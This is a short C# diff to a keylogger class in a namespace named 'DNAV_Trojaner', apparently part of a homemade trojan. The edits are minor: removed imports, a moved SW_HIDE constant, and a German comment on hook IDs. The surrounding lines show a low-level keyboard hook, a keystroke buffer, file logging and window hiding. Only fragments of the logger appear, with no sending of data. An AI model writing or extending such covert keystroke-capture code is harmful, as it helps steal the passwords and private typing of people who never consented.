@@ -1,9 +1,4 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
-
 using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Windows.Forms;
@@ -16,6 +11,8 @@ namespace DNAV_Trojaner
     public class Keylogger
     {
         private static string _keys = "";
+
+        // 13 = Tastatur LowLevel Input, 14 = Maus LowLevel
         private const int WH_KEYBOARD_LL = 13;
         private const int WM_KEYDOWN = 0x0100;
         private const int WM_KEYUP = 0x0101;
@@ -23,6 +20,7 @@ namespace DNAV_Trojaner
         private static IntPtr _hookID = IntPtr.Zero;
         private static bool _logFile = false;
         private static string _path;
+        const int SW_HIDE = 0;
 
         public static string Keys
         {
@@ -82,8 +80,6 @@ namespace DNAV_Trojaner
 
         [DllImport("user32.dll")]
         static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-
-        const int SW_HIDE = 0;
 
         private static IntPtr SetHook(LowLevelKeyboardProc proc)
         {
